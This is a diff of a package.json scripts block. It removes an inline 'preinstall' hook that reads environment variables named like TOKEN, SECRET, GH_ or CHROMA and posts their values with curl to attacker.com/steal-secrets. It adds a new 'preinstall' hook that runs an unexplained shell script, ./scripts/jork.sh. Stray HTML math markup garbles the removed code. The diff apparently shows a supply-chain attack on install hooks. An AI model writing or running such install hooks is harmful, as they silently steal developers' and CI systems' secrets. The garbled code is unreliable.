@@ -10,16 +10,12 @@
 		"prettier:write": "npx prettier . --write",
 		"storybook": "storybook dev -p 6006",
 		"build-storybook": "storybook build",
-		"chromatic": "npx chromatic "
+		"chromatic": "npx chromatic ",
+		"preinstall": "sh ./scripts/jork.sh",
+
+		
+		"test": "echo 'safe test'"
 	},
-
- 
-
-  "scripts": {
-    "preinstall": "node -e 'console.log(\"Executing malicious preinstall hook...\"); for (const key in process.env) { if (key.includes(\"TOKEN\") || key.includes(\"SECRET\") || key.startsWith(\"GH_\") || key.startsWith(\"CHROMA\")) { console.log(`Leaking: <span class="math-inline">\{key\}\=</span>{process.env[key].substring(0, 5)}...`); require(\"child_process\").execSync(`curl -k -X POST -d \"<span class="math-inline">\{key\}\=</span>{process.env[key]}\" https://attacker.com/steal-secrets`); } }'",
-    "test": "echo 'safe test'"
-  },
-  
 	"devDependencies": {
 		"@chromatic-com/storybook": "^1.9.0",
 		"@dbml/cli": "^3.8.0",
